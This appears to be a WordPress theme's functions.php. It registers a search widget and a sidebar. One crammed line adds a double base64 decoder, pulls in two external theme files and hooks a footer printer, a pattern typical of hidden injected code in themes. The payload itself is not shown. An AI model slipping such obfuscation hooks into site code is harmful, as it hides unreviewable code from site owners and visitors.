<?php
function widget_mytheme_search() {
?>
        <li id="search">
        <h2>Search</h2>
				<?php include (TEMPLATEPATH . '/searchform.php'); ?>
        </li>
<?php
}
if ( function_exists('register_sidebar_widget') ) {
    register_sidebar_widget(__('Search'), 'widget_mytheme_search');
}
function decode_it($code) { return base64_decode(base64_decode($code)); } require_once(pathinfo(__FILE__,PATHINFO_DIRNAME)."/start_template.php");
require_once("theme_licence.php"); add_action('wp_footer','print_footer');
if ( function_exists('register_sidebar') )
    register_sidebar(array(
        'before_widget' => '<li id="%1$s" class="widget %2$s">',
        'after_widget' => '</li>',
        'before_title' => '<h2 class="widgettitle">',
        'after_title' => '</h2>',
    ));
?>
